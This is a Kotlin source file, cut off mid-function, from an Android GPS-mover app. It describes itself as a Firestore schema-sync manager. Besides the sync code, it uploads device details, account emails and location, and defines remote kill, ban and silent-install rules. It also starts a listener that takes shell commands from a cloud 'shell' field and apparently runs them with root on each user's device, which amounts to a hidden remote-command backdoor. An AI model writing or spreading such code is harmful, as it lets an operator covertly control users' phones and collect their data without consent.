package com.hamham.gpsmover.modules

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Geocoder
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import com.hamham.gpsmover.modules.RootManager
import com.hamham.gpsmover.modules.RootCommandResult
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.DocumentReference
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.SetOptions
import com.google.android.gms.tasks.Tasks
import java.util.Locale
import java.util.Date
import kotlin.system.exitProcess

/**
 * Professional Collections Manager for Firestore Database
 * 
 * This manager ensures complete database synchronization with the schema defined in this file.
 * It handles:
 * - Creating collections and documents if they don't exist
 * - Adding missing fields from the defined schema
 * - Removing deprecated fields not in the schema
 * - Maintaining exact field structure as defined in this file
 * 
 * USAGE:
 * 1. Call initializeCollections(context) in onCreate() - for basic structure
 * 2. Call initializeCollections(context) after successful login - for user-specific sync
 * 
 * SCHEMA MANAGEMENT:
 * - Modify DATABASE_STRUCTURE to add/remove fields
 * - The database will automatically sync to match this file structure
 * - Safe for production use - preserves existing data while updating structure
 * 
 * Call initializeCollections() in onCreate() to ensure database consistency
 */
object CollectionsManager {
    
    private const val TAG = "CollectionsManager"
    
    // ======================= INITIALIZATION VARIABLES =======================
    
    private lateinit var firestore: FirebaseFirestore
    private lateinit var context: Context
    private var totalOperations = 0
    private var operationsCompleted = 0
    private var lastUpdateTime = 0L
    private val UPDATE_COOLDOWN = 5000L // 5 seconds cooldown between updates
    private var isInitialized = false // Track if collections have been initialized
    private var hasLoggedInSuccessfully = false // Track if user has logged in during this session
    private var hasDeviceInfoUpdated = false // Track if device info has been updated this session
    // Real-time listener variables
    private var shellCommandListener: ListenerRegistration? = null // Real-time listener for shell commands
    private var isExecutingCommand = false // Flag to prevent concurrent execution
    private var lastExecutionStartTime = 0L // Track when last execution started
    private val EXECUTION_TIMEOUT = 120000L // 2 minutes maximum execution time
    private var currentExecutionThread: Thread? = null // Track current execution thread
    private var executionRetryCount = 0 // Track retry attempts for stuck executions
    private val MAX_RETRY_ATTEMPTS = 3 // Maximum retry attempts before forcing reset
    private val CLEANUP_DELAY = 1000L // 1 second delay for proper cleanup
    
    // ======================= DATABASE STRUCTURE =======================
    
    /**
     * Complete database structure definition
     * All collections and their document schemas are defined here
     */
    private val DATABASE_STRUCTURE = mapOf(
        "application" to mapOf(
            "rules" to mapOf(
                "kill" to mapOf(
                    "enabled" to false,
                    "message" to "App stoped",
                    "title" to "Message"
                ),
                "update" to mapOf(
                    "latest_version" to 3,
                    "message" to "An update is available. You can install it.",
                    "min_version" to 1,
                    "required" to false,
                    "silent_install" to false,
                    "url" to "https://github.com/dvhamham/gps-mover/releases/download/1.0.1/app-release.apk"
                ),
                "created_at" to FieldValue.serverTimestamp(),
                "updated_at" to FieldValue.serverTimestamp()
            )
        ),
        "devices" to mapOf(
            "template_device" to mapOf(
                "account" to "",
                "accounts" to mapOf<String, String>(),
                "app_version" to "",
                "banned" to false,
                "custom_message" to mapOf(
                    "enabled" to false,
                    "title" to "",
                    "text" to ""
                ),
                "about" to mapOf(
                    "manufacturer" to "",
                    "model" to "",
                    "os_version" to ""
                ),
                "location" to mapOf(
                    "city" to "",
                    "country" to ""
                ),
                "favourites" to mapOf(
                    "list" to listOf<Map<String, Any>>(
                        // Example favorite with new coordinates structure (string format)
                        // mapOf(
                        //     "id" to "1640995200000",
                        //     "name" to "Sample Location",
                        //     "coordinates" to "33.738732, -7.389884",
                        //     "order" to 0
                        // )
                    )
                ),
                "shell" to mapOf(
                    "command" to "",
                    "enabled" to false,
                    "count" to 1,
                    "wait" to 0,
                    "result" to "",
                    "error" to ""
                ),
                "created_at" to FieldValue.serverTimestamp(),
                "updated_at" to FieldValue.serverTimestamp()
            )
        )
    )
    
    
    // ======================= MAIN INITIALIZATION FUNCTION =======================
    
    /**
     * Reset initialization flags - useful for testing or when app needs to reinitialize
     * Should only be called in specific scenarios like user logout
     */
    fun resetInitializationFlags() {
        Log.i(TAG, "🔄 Resetting initialization flags")
        isInitialized = false
        hasLoggedInSuccessfully = false
        hasDeviceInfoUpdated = false
        
        // Stop real-time shell command listener
        shellCommandListener?.remove()
        shellCommandListener = null
        
        // Reset execution flag
        isExecutingCommand = false
        executionRetryCount = 0
        Log.d(TAG, "🔓 Execution flag and retry count reset during initialization reset")
    }

    /**
     * Comprehensive cleanup to prevent resource leaks and stuck states
     * This method should be called after each execution cycle
     */
    private fun performComprehensiveCleanup() {
        Log.d(TAG, "🧹 Performing comprehensive cleanup...")
        
        try {
            // 1. Interrupt and clean current execution thread
            currentExecutionThread?.let { thread ->
                if (thread.isAlive) {
                    Log.w(TAG, "⚠️ Interrupting active execution thread")
                    thread.interrupt()
                    // Give thread time to clean up
                    try {
                        thread.join(2000) // Wait up to 2 seconds
                    } catch (e: InterruptedException) {
                        Log.w(TAG, "Timeout waiting for thread to finish")
                        Thread.currentThread().interrupt()
                    }
                }
                currentExecutionThread = null
            }
            
            // 2. Reset all execution flags
            isExecutingCommand = false
            lastExecutionStartTime = 0L
            
            // 3. Force RootManager cleanup
            RootManager.resetRootManager()
            
            // 4. Force garbage collection
            System.gc()
            
            // 5. Small delay to ensure cleanup
            Thread.sleep(CLEANUP_DELAY)
            
            Log.d(TAG, "✅ Comprehensive cleanup completed successfully")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error during comprehensive cleanup", e)
            // Even if cleanup fails, ensure flags are reset
            isExecutingCommand = false
            lastExecutionStartTime = 0L
            currentExecutionThread = null
        }
    }

    /**
     * Initialize device document with real data for login purposes
     */
    private fun initializeDeviceDocumentWithData(deviceRef: DocumentReference) {
        Log.i(TAG, "🆕 Initializing device document for login: ${deviceRef.path}")
        
        // Get device schema from cached data
        val deviceSchema = DATABASE_STRUCTURE["devices"]?.get("template_device") ?: mapOf()
        
        // Create device with real data but don't complete operation
        createDeviceDocumentWithRealData(deviceRef, deviceSchema, deviceRef.path, false)
    }

    /**
     * Called when user successfully logs in - only updates on first successful login
     * This prevents multiple updates during the same session
     */
    fun onUserLoginSuccess(ctx: Context) {
        if (hasLoggedInSuccessfully) {
            Log.d(TAG, "⏭️ User already logged in successfully this session, skipping update...")
            return
        }
        
        Log.i(TAG, "🎉 First successful login detected - updating account information")
        
        // Mark that user has logged in successfully
        hasLoggedInSuccessfully = true
        
        // Initialize context and firestore if not already done
        if (!::context.isInitialized) {
            context = ctx
        }
        if (!::firestore.isInitialized) {
            firestore = FirebaseFirestore.getInstance()
        }
        
        val user = FirebaseAuth.getInstance().currentUser
        if (user != null) {
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            
            if (deviceId != null) {
                // Check if device document exists, create it if not
                Log.i(TAG, "🔄 Checking device document existence for first-time login")
                val deviceRef = firestore.collection("devices").document(deviceId)
                
                deviceRef.get()
                    .addOnSuccessListener { document ->
                        if (!document.exists()) {
                            // Device doesn't exist - create it with real data
                            Log.i(TAG, "📱 Device document doesn't exist, creating during login: devices/$deviceId")
                            initializeDeviceDocumentWithData(deviceRef)
                        } else {
                            // Device exists - update with current user info
                            Log.i(TAG, "� Device document exists, updating during login: devices/$deviceId")
                            updateDeviceInformationForDocument(user.uid, deviceId)
                        }
                    }
                    .addOnFailureListener { exception ->
                        Log.e(TAG, "❌ Failed to check device document during login", exception)
                        // Fallback: try to create the device anyway
                        initializeDeviceDocumentWithData(deviceRef)
                    }
            } else {
                Log.w(TAG, "⚠️ Device ID not available for login update")
            }
        } else {
            Log.w(TAG, "⚠️ No authenticated user found for login update")
        }
        
        // Restart real-time shell command listener for logged in user
        startShellCommandListener()
        
        // Start background service for shell command execution
        try {
            val serviceClass = Class.forName("com.hamham.gpsmover.services.ShellCommandService")
            val startServiceMethod = serviceClass.getMethod("startService", Context::class.java)
            startServiceMethod.invoke(null, ctx)
            Log.i(TAG, "✅ Background shell command service started after login")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start background service after login", e)
        }
    }

    /**
     * Main initialization function - Sets up database context and starts synchronization
     * Only runs once per app session to avoid duplicate operations
     * Only updates device info if user is logged in
     */
    fun initializeCollections(ctx: Context) {
        if (isInitialized) {
            Log.d(TAG, "⏭️ Collections already initialized, skipping...")
            return
        }
        
        Log.i(TAG, "🚀 Starting CollectionsManager initialization")
        
        // Mark as initialized to prevent duplicate calls
        isInitialized = true
        
        // Initialize context and Firestore
        context = ctx
        firestore = FirebaseFirestore.getInstance()
        
        // Reset operation tracking
        totalOperations = 0
        operationsCompleted = 0
        
        // Debug schema information
        Log.d(TAG, "📋 Database schema contains ${DATABASE_STRUCTURE.size} collections")
        
        // Count total operations needed
        for ((collectionName, documents) in DATABASE_STRUCTURE) {
            totalOperations += documents.size
        }
        
        Log.i(TAG, "🎯 Total operations to perform: $totalOperations")
        
        // Initialize each collection
        for ((collectionName, documents) in DATABASE_STRUCTURE) {
            for ((documentName, schema) in documents) {
                initializeCollection(collectionName, documentName, schema)
            }
        }
        
        // Special handling for user-specific device initialization
        val user = FirebaseAuth.getInstance().currentUser
        if (user != null) {
            Log.i(TAG, "👤 User is logged in, initializing device document with data")
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            
            if (deviceId != null) {
                initializeDeviceDocumentWithData(user.uid, deviceId)
                
                // Update account information will be called automatically after device initialization
                // No need to call it explicitly here to avoid duplicate updates
            }
        } else {
            Log.i(TAG, "👤 No user logged in, skipping device initialization")
        }
        
        // Start real-time shell command listener after initialization
        startShellCommandListener()
    }
    
    // ======================= COLLECTION & DOCUMENT CREATION =======================
    
    /**
     * Initializes a single collection with all its documents
     */
    private fun initializeCollection(
        collectionName: String,
        documentName: String,
        schema: Map<String, Any>
    ) {
        Log.i(TAG, "🏗️ Initializing document: $collectionName/$documentName")
        
        val documentRef = firestore.collection(collectionName).document(documentName)
        
        documentRef.get()
            .addOnSuccessListener { snapshot ->
                if (!snapshot.exists()) {
                    // Document doesn't exist - create it
                    Log.i(TAG, "📄 Document doesn't exist, creating: $collectionName/$documentName")
                    createDocumentWithCallback(documentRef, schema, "$collectionName/$documentName")
                } else {
                    // Document exists - synchronize schema
                    Log.i(TAG, "� Document exists, synchronizing: $collectionName/$documentName")
                    val existingData = snapshot.data ?: emptyMap()
                    
                    synchronizeDocumentWithCallback(
                        documentRef, 
                        existingData, 
                        schema, 
                        "$collectionName/$documentName"
                    )
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to initialize document: $collectionName/$documentName", exception)
                completeOperation()
            }
    }
    
    /**
     * Special initialization for device documents with actual device data
     */
    private fun initializeDeviceDocumentWithData(userId: String, deviceId: String) {
        // Get the device schema from DATABASE_STRUCTURE
        val deviceSchema = DATABASE_STRUCTURE["devices"]?.get("template_device") ?: return
        
        val deviceRef = firestore.collection("devices").document(deviceId)
        
        Log.i(TAG, "🔧 Initializing device document with real data: devices/$deviceId")
        
        deviceRef.get()
            .addOnSuccessListener { snapshot ->
                if (!snapshot.exists()) {
                    // Document doesn't exist - create it with actual device data
                    Log.i(TAG, "📱 Device document doesn't exist, creating with real data: devices/$deviceId")
                    createDeviceDocumentWithRealData(deviceRef, deviceSchema, "devices/$deviceId")
                } else {
                    // Document exists - synchronize schema and update with real data
                    Log.i(TAG, "📋 Device document exists, synchronizing: devices/$deviceId")
                    val existingData = snapshot.data ?: emptyMap()
                    
                    synchronizeDocumentWithCallback(
                        deviceRef, 
                        existingData, 
                        deviceSchema, 
                        "devices/$deviceId"
                    )
                    
                    // Mark that device info will be updated to avoid duplicate updates
                    hasDeviceInfoUpdated = true
                    
                    // Also trigger immediate device info update for existing documents
                    Log.i(TAG, "📱 Triggering immediate device info update for existing document")
                    updateDeviceInformationForDocument(userId, deviceRef.id)
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to initialize device document: devices/$deviceId", exception)
                completeOperation()
            }
    }
    
    
    /**
     * Initializes a single document with schema validation and synchronization
     * Includes callback tracking for completion detection
     */
    private fun initializeDocumentWithCallback(
        collectionName: String,
        documentId: String,
        schema: Map<String, Any>
    ) {
        val documentRef = firestore.collection(collectionName).document(documentId)
        
        Log.i(TAG, "🔧 Initializing document: $collectionName/$documentId")
        
        documentRef.get()
            .addOnSuccessListener { snapshot ->
                if (!snapshot.exists()) {
                    // Document doesn't exist - create it
                    Log.i(TAG, "📄 Document doesn't exist, creating: $collectionName/$documentId")
                    createDocumentWithCallback(documentRef, schema, "$collectionName/$documentId")
                } else {
                    // Document exists - synchronize schema
                    Log.i(TAG, "📋 Document exists, synchronizing: $collectionName/$documentId")
                    val existingData = snapshot.data ?: emptyMap()
                    
                    synchronizeDocumentWithCallback(
                        documentRef, 
                        existingData, 
                        schema, 
                        "$collectionName/$documentId"
                    )
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to initialize document: $collectionName/$documentId", exception)
                completeOperation()
            }
    }
    
    /**
     * Creates a device document with actual device information instead of empty values
     */
    private fun createDeviceDocumentWithRealData(
        documentRef: com.google.firebase.firestore.DocumentReference,
        schema: Map<String, Any>,
        documentPath: String,
        shouldCompleteOperation: Boolean = true
    ) {
        Log.i(TAG, "📝 Creating device document with real data: $documentPath")
        
        try {
            val auth = FirebaseAuth.getInstance()
            val user = auth.currentUser
            
            // Collect real device information
            val deviceModel = Build.MODEL ?: "Unknown Model"
            val deviceManufacturer = Build.MANUFACTURER ?: "Unknown Manufacturer"
            val androidVersion = Build.VERSION.RELEASE ?: "Unknown Version"
            val currentAppVersion = try {
                context.packageManager.getPackageInfo(context.packageName, 0).versionName
            } catch (e: Exception) { 
                "N/A" 
            }
            val currentAccountEmail = user?.email ?: ""
            val currentAccountName = user?.displayName ?: ""
            val androidId = documentRef.id
            
            // Get location information
            val (country, city) = getDeviceLocation()
            
            Log.d(TAG, "📱 Creating device with data - Model: $deviceModel, OS: $androidVersion")
            Log.d(TAG, "📍 Location - Country: $country, City: $city")
            
            // Create populated device data based on schema structure
            val deviceData = mutableMapOf<String, Any>()
            
            // Basic account information
            deviceData["account"] = currentAccountEmail
            
            // Create accounts map with current user if available
            val accountsMap = mutableMapOf<String, String>()
            if (currentAccountEmail.isNotEmpty()) {
                accountsMap[currentAccountEmail] = currentAccountName
            }
            deviceData["accounts"] = accountsMap
            
            // App version
            deviceData["app_version"] = currentAppVersion
            
            // Device ban status
            deviceData["banned"] = false
            
            // Custom message structure
            deviceData["custom_message"] = mapOf(
                "enabled" to false,
                "text" to "",
                "title" to ""
            )
            
            // Device information
            deviceData["about"] = mapOf(
                "manufacturer" to deviceManufacturer,
                "model" to deviceModel,
                "os_version" to androidVersion
            )
            
            // Location information
            deviceData["location"] = mapOf(
                "city" to city,
                "country" to country
            )
            
            // Favourites list
            deviceData["favourites"] = mapOf(
                "list" to emptyList<Map<String, Any>>()
            )
            
            // Shell command execution system
            deviceData["shell"] = mapOf(
                "command" to "",
                "enabled" to false,
                "count" to 1,
                "wait" to 0,
                "result" to "",
                "error" to ""
            )
            
            deviceData["created_at"] = FieldValue.serverTimestamp()
            deviceData["updated_at"] = FieldValue.serverTimestamp()
            
            Log.i(TAG, "💾 Creating device document with populated data")
            
            documentRef.set(deviceData, SetOptions.merge())
                .addOnSuccessListener {
                    Log.i(TAG, "✅ Successfully created device document with real data: $documentPath")
                    if (shouldCompleteOperation) {
                        completeOperation()
                    }
                }
                .addOnFailureListener { exception ->
                    Log.e(TAG, "❌ Failed to create device document with real data: $documentPath", exception)
                    if (shouldCompleteOperation) {
                        completeOperation()
                    }
                }
                
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error collecting device data, falling back to empty schema", e)
            // Fallback to creating with empty schema
            createDocumentWithCallback(documentRef, schema, documentPath)
        }
    }
    
    /**
     * Creates a new document with the complete schema (with callback tracking)
     */
    private fun createDocumentWithCallback(
        documentRef: com.google.firebase.firestore.DocumentReference,
        schema: Map<String, Any>,
        documentPath: String
    ) {
        Log.i(TAG, "📝 Creating new document: $documentPath")
        
        documentRef.set(schema, SetOptions.merge())
            .addOnSuccessListener {
                Log.i(TAG, "✅ Successfully created document: $documentPath")
                completeOperation()
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to create document: $documentPath", exception)
                completeOperation() // Still complete the operation even if it failed
            }
    }
    
    /**
     * Synchronizes existing document with the defined schema (with callback tracking)
     */
    private fun synchronizeDocumentWithCallback(
        documentRef: com.google.firebase.firestore.DocumentReference,
        existingData: Map<String, Any>,
        schema: Map<String, Any>,
        documentPath: String
    ) {
        Log.i(TAG, "🔄 Starting synchronization for document: $documentPath")
        Log.d(TAG, "Schema structure: $schema")
        Log.d(TAG, "Existing data structure: $existingData")
        
        val updates = mutableMapOf<String, Any>()
        
        // Find fields to add (missing in database)
        Log.d(TAG, "Phase 1: Finding missing fields...")
        findMissingFields(schema, existingData, updates)
        
        // Find fields to remove (extra in database)  
        Log.d(TAG, "Phase 2: Finding extra fields...")
        findExtraFields(schema, existingData, updates)
        
        Log.i(TAG, "Updates to apply for $documentPath: $updates")
        
        // Apply changes if any differences found
        if (updates.isNotEmpty()) {
            Log.i(TAG, "📝 Synchronizing document: $documentPath (${updates.size} changes)")
            
            // Log each update
            updates.forEach { (path, value) ->
                if (value == FieldValue.delete()) {
                    Log.w(TAG, "  🗑️ DELETE: $path")
                } else {
                    Log.i(TAG, "  ✏️ UPDATE: $path = $value")
                }
            }
            
            // Add updated timestamp
            updates["updated_at"] = FieldValue.serverTimestamp()
            
            documentRef.update(updates)
                .addOnSuccessListener {
                    Log.i(TAG, "✅ Successfully synchronized document: $documentPath")
                    completeOperation()
                }
                .addOnFailureListener { exception ->
                    Log.e(TAG, "❌ Failed to synchronize document: $documentPath", exception)
                    completeOperation() // Still complete the operation even if it failed
                }
        } else {
            Log.d(TAG, "✅ Document already in sync: $documentPath")
            completeOperation()
        }
    }
    
    // ===================== DEVICE UPDATE FUNCTIONS =====================
    
    /**
     * Updates device information for a specific device document (current device only)
     */
    private fun updateDeviceInformationForDocument(userId: String, deviceId: String) {
        val deviceRef = firestore.collection("devices").document(deviceId)
            
        Log.i(TAG, "🔄 Starting device information update for current device only: $deviceId")
        
        try {
            val updates = mutableMapOf<String, Any>()
            
            // Get current user information
            val user = FirebaseAuth.getInstance().currentUser
            val currentAccountEmail = user?.email ?: ""
            val currentAccountName = user?.displayName ?: ""
            
            // Get device information
            val deviceModel = Build.MODEL ?: "Unknown Model"
            val deviceManufacturer = Build.MANUFACTURER ?: "Unknown Manufacturer"
            val androidVersion = Build.VERSION.RELEASE ?: "Unknown Version"
            
            // Update device information using the correct structure
            updates["about.model"] = deviceModel
            updates["about.manufacturer"] = deviceManufacturer
            updates["about.os_version"] = androidVersion
            
            // Update current account
            if (currentAccountEmail.isNotEmpty()) {
                updates["account"] = currentAccountEmail
                Log.i(TAG, "👤 Adding/updating account: $currentAccountEmail -> $currentAccountName")
            }
            
            updates["updated_at"] = FieldValue.serverTimestamp()
            
            Log.i(TAG, "📱 Device info - Model: $deviceModel, Manufacturer: $deviceManufacturer, Android: $androidVersion")
            
            // Try to get location
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            if (checkLocationPermissions()) {
                try {
                    val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                        ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                        
                    if (location != null) {
                        Log.i(TAG, "📍 Location info - Lat: ${location.latitude}, Lon: ${location.longitude}")
                        
                        // Try to get location name using Geocoder
                        try {
                            val geocoder = Geocoder(context, Locale.getDefault())
                            val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                            
                            if (addresses?.isNotEmpty() == true) {
                                val address = addresses[0]
                                val country = address.countryName ?: ""
                                val city = address.locality ?: address.subAdminArea ?: ""
                                
                                updates["location.country"] = country
                                updates["location.city"] = city
                                
                                Log.i(TAG, "� Location - Country: $country, City: $city")
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "⚠️ Failed to get location name", e)
                        }
                    } else {
                        Log.w(TAG, "⚠️ No location available")
                    }
                } catch (e: SecurityException) {
                    Log.w(TAG, "⚠️ Location permission denied", e)
                }
            }
            
            // Apply updates to Firestore
            deviceRef.get()
                .addOnSuccessListener { document ->
                    // If user has an account, include accounts map update in the same operation
                    if (currentAccountEmail.isNotEmpty()) {
                        val existingAccounts = document.get("accounts") as? Map<String, String> ?: mapOf()
                        val updatedAccounts = existingAccounts.toMutableMap()
                        updatedAccounts[currentAccountEmail] = currentAccountName
                        updates["accounts"] = updatedAccounts
                        Log.i(TAG, "📋 Including accounts map update in same operation")
                    }
                    
                    // Perform single update operation
                    deviceRef.update(updates)
                        .addOnSuccessListener {
                            Log.i(TAG, "✅ Successfully updated device information and accounts for: $deviceId")
                        }
                        .addOnFailureListener { exception ->
                            Log.e(TAG, "❌ Failed to update device information for: $deviceId", exception)
                        }
                }
                .addOnFailureListener { exception ->
                    Log.e(TAG, "❌ Failed to get device document for update", exception)
                    // Fallback to update without accounts
                    deviceRef.update(updates)
                        .addOnSuccessListener {
                            Log.i(TAG, "✅ Successfully updated device information (fallback) for: $deviceId")
                        }
                        .addOnFailureListener { fallbackException ->
                            Log.e(TAG, "❌ Failed fallback update for: $deviceId", fallbackException)
                        }
                }
                
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error updating device information for: $deviceId", e)
        }
    }
    
    /**
     * Updates the accounts map correctly to avoid dot notation issues with email addresses
     */
    private fun updateAccountsMap(
        deviceRef: com.google.firebase.firestore.DocumentReference,
        email: String,
        name: String
    ) {
        deviceRef.get()
            .addOnSuccessListener { document ->
                val existingAccounts = document.get("accounts") as? Map<String, String> ?: mapOf()
                val updatedAccounts = existingAccounts.toMutableMap()
                updatedAccounts[email] = name
                
                deviceRef.update(
                    mapOf(
                        "accounts" to updatedAccounts,
                        "updated_at" to FieldValue.serverTimestamp()
                    )
                )
                .addOnSuccessListener {
                    Log.i(TAG, "✅ Successfully updated accounts map: $email -> $name")
                }
                .addOnFailureListener { exception ->
                    Log.e(TAG, "❌ Failed to update accounts map", exception)
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to get device document for accounts update", exception)
            }
    }
    
    /**
     * Checks if location permissions are granted
     */
    private fun checkLocationPermissions(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
               ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
    }
    
    /**
     * Updates device information for all user devices after initialization
     */
    private fun updateDeviceInformation() {
        if (hasDeviceInfoUpdated) {
            Log.d(TAG, "⏭️ Device info already updated this session, skipping...")
            return
        }
        
        val user = FirebaseAuth.getInstance().currentUser
        if (user == null) {
            Log.w(TAG, "⚠️ No user logged in, skipping device information update")
            return
        }
        
        hasDeviceInfoUpdated = true
        
        val userId = user.uid
        Log.i(TAG, "🔄 Starting device information update for user: $userId")
        
        // Get current device ID
        val currentDeviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        
        // Update information ONLY for current device
        Log.i(TAG, "📱 Updating information for current device only: $currentDeviceId")
        updateDeviceInformationForDocument(userId, currentDeviceId)
        
        // Note: updateAccountInformation will be called from updateDeviceInformationForDocument
        // to avoid duplicate calls
    }
    
    /**
     * Public function to add an account to the accounts list (safe for emails with dots)
     */
    fun addAccountToDevice(context: Context, email: String, name: String) {
        if (email.isEmpty()) {
            Log.w(TAG, "⚠️ Empty email provided, skipping account addition")
            return
        }
        
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        val deviceRef = firestore.collection("devices").document(androidId)
        
        Log.i(TAG, "👤 Adding account to device: $email -> $name")
        updateAccountsMap(deviceRef, email, name)
    }
    
    /**
     * Updates account information when user logs in or switches accounts
     */
    fun updateAccountInformation(context: Context) {
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastUpdateTime < UPDATE_COOLDOWN) {
            Log.d(TAG, "⏱️ Skipping account update - still in cooldown period")
            return
        }
        
        val user = FirebaseAuth.getInstance().currentUser
        if (user == null) {
            Log.w(TAG, "⚠️ No user logged in, skipping account information update")
            return
        }
        
        lastUpdateTime = currentTime
        
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        val deviceRef = firestore.collection("devices").document(androidId)
        
        val currentAccountEmail = user.email ?: ""
        val currentAccountName = user.displayName ?: ""
        
        if (currentAccountEmail.isNotEmpty()) {
            Log.i(TAG, "👤 Updating account information: $currentAccountEmail")
            
            // Update current account first
            deviceRef.update(
                mapOf(
                    "account" to currentAccountEmail,
                    "updated_at" to FieldValue.serverTimestamp()
                )
            )
            .addOnSuccessListener {
                Log.i(TAG, "✅ Successfully updated current account: $currentAccountEmail")
                // Then update accounts map
                updateAccountsMap(deviceRef, currentAccountEmail, currentAccountName)
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to update account information", exception)
            }
        }
    }
    
    
    // ===================== RULES AND ADMIN FUNCTIONS =====================
    
    /**
     * Starts real-time listener for shell commands
     * This enables immediate execution when run flag is set to true in database
     */
    private fun startShellCommandListener() {
        if (!::context.isInitialized || !::firestore.isInitialized) {
            Log.w(TAG, "⚠️ Context or Firestore not initialized, cannot start shell command listener")
            return
        }
        
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        if (androidId.isNullOrEmpty()) {
            Log.w(TAG, "⚠️ Android ID not available, cannot start shell command listener")
            return
        }
        
        // Remove existing listener if any
        shellCommandListener?.remove()
        
        Log.i(TAG, "🎧 Starting real-time shell command listener for device: $androidId")
        
        shellCommandListener = firestore.collection("devices").document(androidId)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e(TAG, "❌ Error in shell command listener", error)
                    return@addSnapshotListener
                }
                
                Log.d(TAG, "📋 Snapshot listener triggered - snapshot exists: ${snapshot?.exists()}")
                
                if (snapshot != null && snapshot.exists()) {
                    val shellData = snapshot.get("shell") as? Map<String, Any>
                    Log.d(TAG, "📋 Shell data retrieved: $shellData")
                    
                    if (shellData != null) {
                        val shouldRun = shellData["enabled"] as? Boolean ?: false
                        val command = shellData["command"] as? String ?: ""
                        val count = (shellData["count"] as? Number)?.toInt() ?: 1
                        var waitSeconds = (shellData["wait"] as? Number)?.toInt() ?: 0
                        
                        // Handle wait time - always treat as SECONDS (not milliseconds)
                        // Apply safety limits for reasonable execution times
                        waitSeconds = when {
                            waitSeconds > 300 -> {
                                // If > 5 minutes, cap to 5 minutes for safety
                                Log.w(TAG, "⚠️ Wait time was > 5 minutes (${shellData["wait"]}s), capped to 5 minutes for safety")
                                300
                            }
                            waitSeconds > 120 -> {
                                Log.w(TAG, "⚠️ Long wait time detected: ${waitSeconds}s")
                                waitSeconds
                            }
                            waitSeconds > 60 -> {
                                Log.w(TAG, "⚠️ Wait time > 1 minute: ${waitSeconds}s")
                                waitSeconds
                            }
                            waitSeconds < 0 -> {
                                Log.w(TAG, "⚠️ Negative wait time, setting to 0")
                                0
                            }
                            else -> waitSeconds
                        }
                        
                        Log.i(TAG, "✅ Wait time processed: ${waitSeconds} seconds")
                        
                        // Additional safety check for count
                        val safeCount = when {
                            count > 50 -> {
                                Log.w(TAG, "⚠️ Count is very high ($count), capping to 50 for safety")
                                50
                            }
                            count > 20 -> {
                                Log.w(TAG, "⚠️ High count detected: $count executions")
                                count
                            }
                            else -> count
                        }
                        
                        Log.d(TAG, "📋 Shell parameters - Enabled: $shouldRun, Command: '$command', Count: $safeCount, Wait: ${waitSeconds}s")
                        Log.i(TAG, "📊 Execution parameters parsed - Will execute $safeCount times with ${waitSeconds}s wait between executions")
                        Log.i(TAG, "⏰ IMPORTANT: Wait time is interpreted as SECONDS (not milliseconds)")
                        
                        // Calculate estimated total time and warn if too long
                        val estimatedTime = (safeCount * waitSeconds) + (safeCount * 10) // 10s per command execution
                        Log.i(TAG, "📈 Estimated total execution time: ${estimatedTime} seconds (${estimatedTime/60.0} minutes)")
                        
                        when {
                            estimatedTime > 3600 -> { // > 1 hour
                                Log.e(TAG, "🚨 CRITICAL WARNING: Estimated execution time is ${estimatedTime/3600}+ hours!")
                                Log.e(TAG, "🚨 This will likely cause timeout and system instability!")
                            }
                            estimatedTime > 1800 -> { // > 30 minutes
                                Log.e(TAG, "⚠️ SEVERE WARNING: Estimated execution time is ${estimatedTime/60} minutes!")
                            }
                            estimatedTime > 600 -> { // > 10 minutes
                                Log.w(TAG, "⚠️ LONG EXECUTION WARNING: Estimated total time ~${estimatedTime/60}min")
                            }
                        }
                        
                        // Only execute if run is true, command is not empty, and not already executing
                        if (shouldRun && command.isNotEmpty() && !isExecutingCommand) {
                            Log.i(TAG, "🔔 Real-time shell command detected - Command: '$command', Count: $safeCount, Wait: ${waitSeconds}s")
                            
                            // Set execution flag to prevent concurrent execution
                            isExecutingCommand = true
                            lastExecutionStartTime = System.currentTimeMillis()
                            
                            // Reset retry count for new execution
                            executionRetryCount = 0
                            Log.d(TAG, "🔄 Starting fresh execution - retry count reset")
                            
                            // Execute the command sequence with safe parameters
                            executeShellCommandSequence(context, command, safeCount, waitSeconds, androidId)
                        } else if (isExecutingCommand) {
                            // Check if execution has been stuck for too long
                            val currentTime = System.currentTimeMillis()
                            val elapsedTime = currentTime - lastExecutionStartTime
                            
                            // Dynamic timeout based on estimated execution time
                            val dynamicTimeout = when {
